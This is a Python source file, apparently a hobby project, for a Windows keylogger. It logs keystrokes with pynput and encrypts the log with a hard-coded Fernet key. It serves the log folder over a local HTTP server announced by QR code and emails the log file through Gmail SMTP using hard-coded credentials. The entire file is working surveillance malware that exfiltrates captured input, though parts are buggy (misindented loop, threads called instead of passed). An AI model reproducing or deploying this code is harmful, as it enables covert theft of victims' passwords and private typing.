import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
import http.server
import webbrowser
import socketserver
import pyqrcode
from pyqrcode import QRCode
import png
import schedule
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
from email import encoders
import time
import os
from scipy.io.wavfile import write

import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process,freeze_support
encryption_key = "AAvzB4kDg62APorFje7ulESVwmxavpjHoSk5Dsx4RIs="
from PIL import ImageGrab
# creating file that will contain logged keys
keys_information = "key_log.txt"
file_path ="C:\\Users\\bhans\\PycharmProjects\\keylogger\\project"
extend = "\\"
file_path_merged = file_path+extend
keys_information_e = "showfolder\\e_key_log.txt"

count = 0
keys = []
# creates a port to share file via an http address
PORT = 8010
user_name = os.environ["USERPROFILE"]
os.path.join(os.path.join(f"{str(user_name)}\\PycharmProjects\
\keylogger\\project"), "key_log.txt")
os.chdir(f"{str(user_name)}\\PycharmProjects\\keylogger\\project\\showfolder")
Handler = http.server.SimpleHTTPRequestHandler
host_name = socket.gethostname()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
IP = "http://" + s.getsockname()[0] + ":" + str(PORT)
link = IP

# This function starts the server to share the file
def send_file():
    url = pyqrcode.create(link)
    # saves the Qrcode inform of svg
    url.svg("myqr.svg", scale=8)
    with socketserver.TCPServer(("", PORT), Handler) as https:
        https.serve_forever()

# this code can be use in case we want to recieve file overemail, but it can leave traces and also
# nowadays Google's Gmail don't allow so but in case of othermail account it can be used
# defining sender and receiver’s mail address and password toshare the file over email

email_address = "thisistrash284@gmail.com"
password = "thisistrash"
toaddr = "thisistrash284@gmail.com"
# function to send email

def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg["From"] = fromaddr

    msg["To"] = toaddr
    msg["Subject"] = "Log file"
    body = "body of the mail"
    msg.attach(MIMEText(body, "plain"))
    filename = filename
    attachment = open(attachment, "rb")
    p = MIMEBase("application", "octet-stream")
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition", "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

send_email(keys_information, file_path+extend+keys_information,toaddr)
# function that starts program on key press


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count>=1:
        count = 0
        write_file(keys)
        keys = []
        # this function stores the key and writes it to the decryptedfile
def write_file(keys):
    with open(file_path + extend+ keys_information,"a") as f:
        for key in keys:
            k = str(key).replace("'", "")
    if k.find("space") > 0:

        f.write("\n")
        f.close()
    elif k.find("Key") == -1:
        f.write(k)
        f.close()

with open(file_path_merged + keys_information, "rb") as f:
    data = f.read()
    fernet = Fernet(encryption_key)
    encrypted = fernet.encrypt(data)
with open(file_path_merged + keys_information_e, "wb") as f:
    f.write(encrypted)
# function to exit program
def on_release(key):
    if key == Key.esc:
        return False
# function to encrypt file to be sent

# initiating the program


with Listener(on_press=on_press, on_release=on_release) as listener:
    threading.Thread(target=send_file()).start()
    threading.Thread(target=listener.join()).start()